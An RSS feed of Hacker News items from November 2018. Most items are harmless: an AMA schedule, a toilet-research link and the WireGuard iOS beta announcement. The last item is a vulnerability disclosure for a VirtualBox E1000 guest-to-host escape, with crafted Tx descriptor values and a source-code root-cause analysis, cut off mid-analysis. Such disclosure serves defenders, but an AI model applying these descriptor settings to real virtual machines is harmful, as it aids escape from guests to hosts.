<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Reddit AMA on a free alternative to Photoshop used by 1.5M people</title>
<link>https://www.reddit.com/r/IAmA/comments/9urjmg/i_made_a_free_alternative_to_photoshop_that_is/</link>
<guid isPermaLink="true" >https://www.reddit.com/r/IAmA/comments/9urjmg/i_made_a_free_alternative_to_photoshop_that_is/</guid>
<description>&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;7.6712328767123&quot;&gt;

&lt;p&gt;November 7, 2018 &lt;span&gt;• 6:30&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Founder and CEO of Mycroft AI&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;7.6415094339623&quot;&gt;

&lt;p&gt;November 7, 2018 &lt;span&gt;• 7:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CTO/Co-Founder of the birth control app Natural Cycles&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;7.75&quot;&gt;

&lt;p&gt;November 8, 2018 &lt;span&gt;• 6:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Ronimo Games, Dutch Game Developers&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;11&quot;&gt;
&lt;div class=&quot;s12jr8h7-2 fPuduZ&quot;&gt;
&lt;div class=&quot;s12jr8h7-0 uXVbV ser2k5-0 jObvkO&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;md&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;Ben Pearson- Roadster Tracker&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;November 8, 2018 &lt;span&gt;• 13:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Tesla Roadster in space tracker, space enthusist&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;6.6909090909091&quot;&gt;

&lt;p&gt;November 9, 2018 &lt;span&gt;• 8:30&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Reporter for AdWeek&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;4.8717948717949&quot;&gt;

&lt;p&gt;November 9, 2018 &lt;span&gt;• 10:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Full-time Developer + Full-time Employee: Roblox&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;s12jr8h7-2 fPuduZ&quot;&gt;
&lt;div class=&quot;s12jr8h7-0 uXVbV ser2k5-0 jObvkO&quot;&gt;
&lt;div class=&quot;md&quot;&gt;
&lt;p&gt;David McKinsry&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;November 9, 2018 &lt;span&gt;• 11:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The 1st Gay Canadian Man Approved for International Adoption&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;8.9375&quot;&gt;

&lt;p&gt;November 10, 2018 &lt;span&gt;• 4:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;M2H Game Studio, Tannenberg Developer&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;6.0952380952381&quot;&gt;

&lt;p&gt;November 12, 2018 &lt;span&gt;• 12:30&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;InSight Mars Lander&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;12&quot;&gt;
&lt;div class=&quot;s12jr8h7-2 fPuduZ&quot;&gt;
&lt;div class=&quot;s12jr8h7-0 uXVbV ser2k5-0 jObvkO&quot;&gt;
&lt;div class=&quot;md&quot;&gt;
&lt;p&gt;Kurtis Smejkal&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;November 13, 2018 &lt;span&gt;• 14:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Podcaster: Three Angry Nerds, Nerds In Love, Tremble&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;s12jr8h7-2 fPuduZ&quot;&gt;
&lt;div class=&quot;s12jr8h7-0 uXVbV ser2k5-0 jObvkO&quot;&gt;
&lt;div class=&quot;md&quot;&gt;
&lt;p&gt;Roy Oppenheim&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;November 14, 2018 &lt;span&gt;• 9:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Well Recognized Foreclosure Attorney&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;7.029702970297&quot;&gt;

&lt;p&gt;November 27, 2018 &lt;span&gt;• 10:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The Twins That Grew Up Being Judith Grimes&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;s12jr8h7-2 fPuduZ&quot;&gt;
&lt;div class=&quot;s12jr8h7-0 uXVbV ser2k5-0 jObvkO&quot;&gt;
&lt;div class=&quot;md&quot;&gt;
&lt;p&gt;Alberto Daniel Hill&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;November 30, 2018 &lt;span&gt;• 17:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The first Hacker in Uruguay that was sent to prison&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;8.125&quot;&gt;

&lt;p&gt;December 10, 2018 &lt;span&gt;• 13:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Creator of STARSHIP COMMANDER Arcade&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;s12jr8h7-1 iPlUST&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;s12jr8h7-2 fPuduZ&quot;&gt;
&lt;div class=&quot;s12jr8h7-0 uXVbV ser2k5-0 jObvkO&quot;&gt;
&lt;div class=&quot;md&quot;&gt;
&lt;p&gt;Jenna Birch&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;January 3, 2019 &lt;span&gt;• 11:00&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CEO: Plum dating app &amp;amp; Author: The Love Gap&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Wed, 07 Nov 2018 06:03:45 +0000</pubDate>
<dc:creator>arikr</dc:creator>
<og:title>r/IAmA - I made a free alternative to Photoshop, that is used by 1.5 millions of people. Ask me Anything!</og:title>
<og:type>website</og:type>
<og:url>https://www.reddit.com/r/IAmA/comments/9urjmg/i_made_a_free_alternative_to_photoshop_that_is/</og:url>
<og:description>35,903 votes and 1,861 comments so far on Reddit</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.reddit.com/r/IAmA/comments/9urjmg/i_made_a_free_alternative_to_photoshop_that_is/</dc:identifier>
</item>
<item>
<title>Gates Foundation spent $200M funding toilet research</title>
<link>https://www.bloomberg.com/news/articles/2018-11-06/bill-gates-aims-to-save-233-billion-by-reinventing-the-toilet</link>
<guid isPermaLink="true" >https://www.bloomberg.com/news/articles/2018-11-06/bill-gates-aims-to-save-233-billion-by-reinventing-the-toilet</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://www.bloomberg.com/news/articles/2018-11-06/bill-gates-aims-to-save-233-billion-by-reinventing-the-toilet&quot;&gt;https://www.bloomberg.com/news/articles/2018-11-06/bill-gates-aims-to-save-233-billion-by-reinventing-the-toilet&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=18396754&quot;&gt;https://news.ycombinator.com/item?id=18396754&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 344&lt;/p&gt;
&lt;p&gt;# Comments: 202&lt;/p&gt;
</description>
<pubDate>Wed, 07 Nov 2018 02:40:17 +0000</pubDate>
<dc:creator>aportnoy</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.bloomberg.com/tosv2.html?vid=&amp;uuid=60fc5c00-e2a6-11e8-9e95-9155229a59b9&amp;url=L25ld3MvYXJ0aWNsZXMvMjAxOC0xMS0wNi9iaWxsLWdhdGVzLWFpbXMtdG8tc2F2ZS0yMzMtYmlsbGlvbi1ieS1yZWludmVudGluZy10aGUtdG9pbGV0</dc:identifier>
</item>
<item>
<title>WireGuard for iOS</title>
<link>https://lists.zx2c4.com/pipermail/wireguard/2018-November/003526.html</link>
<guid isPermaLink="true" >https://lists.zx2c4.com/pipermail/wireguard/2018-November/003526.html</guid>
<description>&lt;head&gt;&lt;title&gt;WireGuard for iOS - TestFlight&lt;/title&gt;&lt;link rel=&quot;Index&quot; href=&quot;index.html&quot; /&gt;&lt;link rel=&quot;made&quot; href=&quot;mailto:wireguard%40lists.zx2c4.com?Subject=Re%3A%20WireGuard%20for%20iOS%20-%20TestFlight&amp;amp;In-Reply-To=%3CCAHmME9p5bjmP8qSapvf1vmiMAk3BAkONjwXev3O_QtGYM%3Dk3QQ%40mail.gmail.com%3E&quot; /&gt;&lt;meta name=&quot;robots&quot; content=&quot;index,nofollow&quot; /&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;link rel=&quot;Previous&quot; href=&quot;003521.html&quot; /&gt;&lt;link rel=&quot;Next&quot; href=&quot;003527.html&quot; /&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#FFFFFF&quot; id=&quot;readabilityBody&quot; readability=&quot;38.368298368298&quot;&gt;

&lt;p&gt;&lt;strong&gt;Jason A. Donenfeld&lt;/strong&gt; &lt;a href=&quot;mailto:wireguard%40lists.zx2c4.com?Subject=Re%3A%20WireGuard%20for%20iOS%20-%20TestFlight&amp;amp;In-Reply-To=%3CCAHmME9p5bjmP8qSapvf1vmiMAk3BAkONjwXev3O_QtGYM%3Dk3QQ%40mail.gmail.com%3E&quot; title=&quot;WireGuard for iOS - TestFlight&quot;&gt;Jason at zx2c4.com&lt;/a&gt;&lt;br /&gt;&lt;em&gt;Mon Nov 5 22:27:24 CET 2018&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;pre&gt;
Hey folks,

For the last few weeks, Roopesh and I have been hard at work on the
WireGuard for iOS app. Today we're happy to share a
likely-buggy-and-broken TestFlight that you can run on your phone:
&amp;lt;&lt;a href=&quot;https://testflight.apple.com/join/63I19SDT&quot;&gt;https://testflight.apple.com/join/63I19SDT&lt;/a&gt;&amp;gt;. As usual, use at your
own risk, especially since it's alpha quality.

Please let us know about any bugs as you find them -- you can send
them to me or to &lt;a href=&quot;https://lists.zx2c4.com/mailman/listinfo/wireguard&quot;&gt;team at wireguard.com.&lt;/a&gt; Our current TODO list lives here
[1], linked via the main project TODO list [2], and if you're an iOS
person and want to contribute code, we'd be happy to have you on
board.

The app costs $3.99 and requires an email address to sign up; we
manage all your tunnels for you in the cloud. JUST KIDDING! Like the
rest of WireGuard, the iOS app is free and open source [3]. I make
this rather tasteless joke, because of the rather surprising
quantities of people encouraging me to do the iOS stuff as proprietary
paid software, because &quot;apple users will pay&quot; or because &quot;open source
is cool, but iphone folks don't care about it so you can get away with
charging&quot; or because &quot;none of the other vpn players are doing open
source mobile implementations&quot; or even because &quot;apple is more likely
to accept paid software into its app store&quot; and so on and so forth.
But, as usual, I much prefer for this to be a community project than a
closed one, and so like everything else, it's FLOSS.

Enjoy! And do let us know about the bugs as you run into them. I'm
sure there are plenty.

Regards,
Jason

[1] &lt;a href=&quot;https://docs.google.com/document/d/1BnzImOF8CkungFnuRlWhnEpY2OmEHSckat62aZ6LYGY&quot;&gt;https://docs.google.com/document/d/1BnzImOF8CkungFnuRlWhnEpY2OmEHSckat62aZ6LYGY&lt;/a&gt;
[2] &lt;a href=&quot;https://www.wireguard.com/todo/&quot;&gt;https://www.wireguard.com/todo/&lt;/a&gt;
[3] &lt;a href=&quot;https://git.zx2c4.com/wireguard-ios/&quot;&gt;https://git.zx2c4.com/wireguard-ios/&lt;/a&gt;
&lt;/pre&gt;
&lt;hr /&gt;&lt;hr /&gt;&lt;p&gt;&lt;a href=&quot;https://lists.zx2c4.com/mailman/listinfo/wireguard&quot;&gt;More information about the WireGuard mailing list&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
&lt;/body&gt;</description>
<pubDate>Wed, 07 Nov 2018 01:04:15 +0000</pubDate>
<dc:creator>dmmalam</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://lists.zx2c4.com/pipermail/wireguard/2018-November/003526.html</dc:identifier>
</item>
<item>
<title>VirtualBox E1000 Guest-to-Host Escape</title>
<link>https://github.com/MorteNoir1/virtualbox_e1000_0day</link>
<guid isPermaLink="true" >https://github.com/MorteNoir1/virtualbox_e1000_0day</guid>
<description>&lt;div class=&quot;Box-body p-6&quot;&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;&lt;h2&gt;Why&lt;/h2&gt;
&lt;p&gt;I like VirtualBox and it has nothing to do with why I publish a 0day vulnerability. The reason is my disagreement with contemporary state of infosec, especially of security research and bug bounty:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Wait half a year until a vulnerability is patched is considered fine.&lt;/li&gt;
&lt;li&gt;In the bug bounty field these are considered fine:
&lt;ol&gt;&lt;li&gt;Wait more than month until a submitted vulnerability is verified and a decision to buy or not to buy is made.&lt;/li&gt;
&lt;li&gt;Change the decision on the fly. Today you figured out the bug bounty program will buy bugs in a software, week later you come with bugs and exploits and receive &quot;not interested&quot;.&lt;/li&gt;
&lt;li&gt;Have not a precise list of software a bug bounty is interested to buy bugs in. Handy for bug bounties, awkward for researchers.&lt;/li&gt;
&lt;li&gt;Have not precise lower and upper bounds of vulnerability prices. There are many things influencing a price but researchers need to know what is worth to work on and what is not.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;Delusion of grandeur and marketing bullshit: naming vulnerabilities and creating websites for them; making a thousand conferences in a year; exaggerating importance of own job as a security researcher; considering yourself &quot;a world saviour&quot;. Come down, Your Highness.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;I'm exhausted of the first two, therefore my move is full disclosure. Infosec, please move forward.&lt;/p&gt;
&lt;h2&gt;General Information&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable software:&lt;/strong&gt; VirtualBox 5.2.20 and prior versions.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host OS:&lt;/strong&gt; any, the bug is in a shared code base.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest OS:&lt;/strong&gt; any.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;VM configuration:&lt;/strong&gt; default (the only requirement is that a network card is Intel PRO/1000 MT Desktop (82540EM) and a mode is NAT).&lt;/p&gt;
&lt;h2&gt;How to protect yourself&lt;/h2&gt;
&lt;p&gt;Until the patched VirtualBox build is out you can change the network card of your virtual machines to PCnet (either of two) or to Paravirtualized Network. If you can't, change the mode from NAT to another one. The former way is more secure.&lt;/p&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;A default VirtualBox virtual network device is Intel PRO/1000 MT Desktop (82540EM) and the default network mode is NAT. We will refer to it E1000.&lt;/p&gt;
&lt;p&gt;The E1000 has a vulnerability allowing an attacker with root/administrator privileges in a guest to escape to a host ring3. Then the attacker can use existing techniques to escalate privileges to ring 0 via /dev/vboxdrv.&lt;/p&gt;
&lt;h2&gt;Vulnerability Details&lt;/h2&gt;
&lt;h3&gt;E1000 101&lt;/h3&gt;
&lt;p&gt;To send network packets a guest does what a common PC does: it configures a network card and supplies network packets to it. Packets are of data link layer frames and of other, more high level headers. Packets supplied to the adaptor are wrapped in Tx descriptors (Tx means transmit). The Tx descriptor is data structure described in the 82540EM datasheet (317453006EN.PDF, Revision 4.0). It stores such metainformation as packet size, VLAN tag, TCP/IP segmentation enabled flags and so on.&lt;/p&gt;
&lt;p&gt;The 82540EM datasheet provides for three Tx descriptor types: legacy, context, data. Legacy is deprecated I believe. The other two are used together. The only thing we care of is that context descriptors set the maximum packet size and switch TCP/IP segmentation, and that data descriptors hold physical addresses of network packets and their sizes. The data descriptor's packet size must be lesser than the context descriptor's maximum packet size. Usually context descriptors are supplied to the network card before data descriptors.&lt;/p&gt;
&lt;p&gt;To supply Tx descriptors to the network card a guest writes them to Tx Ring. This is a ring buffer residing in physical memory at a predefined address. When all descriptors are written down to Tx Ring the guest updates E1000 MMIO TDT register (Transmit Descriptor Tail) to tell the host there are new descriptors to handle.&lt;/p&gt;
&lt;h3&gt;Input&lt;/h3&gt;
&lt;p&gt;Consider the following array of Tx descriptors:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[context_1, data_2, data_3, context_4, data_5]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Let's assign their structure fields as follows (field names are hypothetical to be human readable but directly map to the 82540EM specification):&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;context_1.header_length = 0
context_1.maximum_segment_size = 0x3010
context_1.tcp_segmentation_enabled = true

data_2.data_length = 0x10
data_2.end_of_packet = false
data_2.tcp_segmentation_enabled = true

data_3.data_length = 0
data_3.end_of_packet = true
data_3.tcp_segmentation_enabled = true

context_4.header_length = 0
context_4.maximum_segment_size = 0xF
context_4.tcp_segmentation_enabled = true

data_5.data_length = 0x4188
data_5.end_of_packet = true
data_5.tcp_segmentation_enabled = true
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We will learn why they should be like that in our step-by-step analysis.&lt;/p&gt;
&lt;h3&gt;Root Cause Analysis&lt;/h3&gt;
&lt;h4&gt;[context_1, data_2, data_3] Processing&lt;/h4&gt;
&lt;p&gt;Let's assume the descriptors above are written to the Tx Ring in the specified order and TDT register is updated by the guest. Now the host will execute e1kXmitPending function in src/VBox/Devices/Network/DevE1000.cpp file (most of comments are and will be stripped for the sake of readability):&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kXmitPending&lt;/span&gt;(PE1KSTATE pThis, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
...
        &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (!pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;fLocked&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;pl-c1&quot;&gt;e1kTxDLazyLoad&lt;/span&gt;(pThis))
        {
            &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kLocateTxPacket&lt;/span&gt;(pThis))
            {
                fIncomplete = &lt;span class=&quot;pl-c1&quot;&gt;false&lt;/span&gt;;
                rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitAllocBuf&lt;/span&gt;(pThis, pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;fGSO&lt;/span&gt;);
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_FAILURE&lt;/span&gt;(rc))
                    &lt;span class=&quot;pl-k&quot;&gt;goto&lt;/span&gt; out;
                rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitPacket&lt;/span&gt;(pThis, fOnWorkerThread);
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_FAILURE&lt;/span&gt;(rc))
                    &lt;span class=&quot;pl-k&quot;&gt;goto&lt;/span&gt; out;
            }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;e1kTxDLazyLoad will read all the 5 Tx descriptors from the Tx Ring. Then e1kLocateTxPacket is called for the first time. This function iterates through all the descriptors to set up an initial state but does not actually handle them. In our case the first call to e1kLocateTxPacket will handle context_1, data_2, and data_3 descriptors. The two remaining descriptors, context_4 and data_5, will be handled at the second iteration of the while loop (we will cover the second iteration in the next section). This two-part array division is crucial to trigger the vulnerability so let's figure out why.&lt;/p&gt;
&lt;p&gt;e1kLocateTxPacket looks like this:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kLocateTxPacket&lt;/span&gt;(PE1KSTATE pThis)
{
...
    &lt;span class=&quot;pl-k&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; i = pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;iTxDCurrent&lt;/span&gt;; i &amp;lt; pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;nTxDFetched&lt;/span&gt;; ++i)
    {
        E1KTXDESC *pDesc = &amp;amp;pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;aTxDescriptors&lt;/span&gt;[i];
        &lt;span class=&quot;pl-k&quot;&gt;switch&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kGetDescType&lt;/span&gt;(pDesc))
        {
            &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_CONTEXT:
                &lt;span class=&quot;pl-c1&quot;&gt;e1kUpdateTxContext&lt;/span&gt;(pThis, pDesc);
                &lt;span class=&quot;pl-k&quot;&gt;continue&lt;/span&gt;;
            &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_LEGACY:
                ...
                &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
            &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_DATA:
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (!pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt; || !pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt;)
                    &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
                ...
                &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
            &lt;span class=&quot;pl-k&quot;&gt;default&lt;/span&gt;:
                &lt;span class=&quot;pl-c1&quot;&gt;AssertMsgFailed&lt;/span&gt;((&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Impossible descriptor type!&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;));
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first descriptor (context_1) is of E1K_DTYP_CONTEXT so e1kUpdateTxContext function is called. This function updates a TCP Segmentation Context if TCP Segmentation is enabled for the descriptor. It is true for context_1 so the TCP Segmentation Context will be updated. (What the TCP Segmentation Context Update actually is, is not important, and we will use this just to refer the code below).&lt;/p&gt;
&lt;p&gt;The second descriptor (data_2) is of E1K_DTYP_DATA so several actions unnecessary for the discussion will be performed.&lt;/p&gt;
&lt;p&gt;The third descriptor (data_3) is also of E1K_DTYP_DATA but since data_3.data_length == 0 no action is performed.&lt;/p&gt;
&lt;p&gt;At the moment the three descriptors are initially processed and the two remain. Now the thing: after the switch statement there is a check wheter a descriptor's end_of_packet field was set. It is true for data_3 descriptor (data_3.end_of_packet == true). The code does some actions and returns from the function:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (pDesc-&amp;gt;legacy.cmd.fEOP)
        {
            ...
            &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;true&lt;/span&gt;;
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If data_3.end_of_packet would been false then the remaining context_4 and data_5 descriptors would be processed, and the vulnerability would been bypassed. Below you'll see why that return from the function leads to the bug.&lt;/p&gt;
&lt;p&gt;At the end of e1kLocateTxPacket function we have the following descriptors ready to unwrap network packets from and to send to a network: context_1, data_2, data_3. Then the inner loop of e1kXmitPending calls e1kXmitPacket. This functions iterates through all the descriptors (5 in our case) to actually process them:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kXmitPacket&lt;/span&gt;(PE1KSTATE pThis, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
...
    &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;iTxDCurrent&lt;/span&gt; &amp;lt; pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;nTxDFetched&lt;/span&gt;)
    {
        E1KTXDESC *pDesc = &amp;amp;pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;aTxDescriptors&lt;/span&gt;[pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;iTxDCurrent&lt;/span&gt;];
        ...
        rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitDesc&lt;/span&gt;(pThis, pDesc, &lt;span class=&quot;pl-c1&quot;&gt;e1kDescAddr&lt;/span&gt;(TDBAH, TDBAL, TDH), fOnWorkerThread);
        ...
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kGetDescType&lt;/span&gt;(pDesc) != E1K_DTYP_CONTEXT &amp;amp;&amp;amp; pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;legacy&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fEOP&lt;/span&gt;)
            &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
    }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For each descriptor e1kXmitDesc function is called:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kXmitDesc&lt;/span&gt;(PE1KSTATE pThis, E1KTXDESC *pDesc, RTGCPHYS addr,
                       &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
...
    &lt;span class=&quot;pl-k&quot;&gt;switch&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kGetDescType&lt;/span&gt;(pDesc))
    {
        &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_CONTEXT:
            ...
            &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
        &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; E1K_DTYP_DATA:
        {
            ...
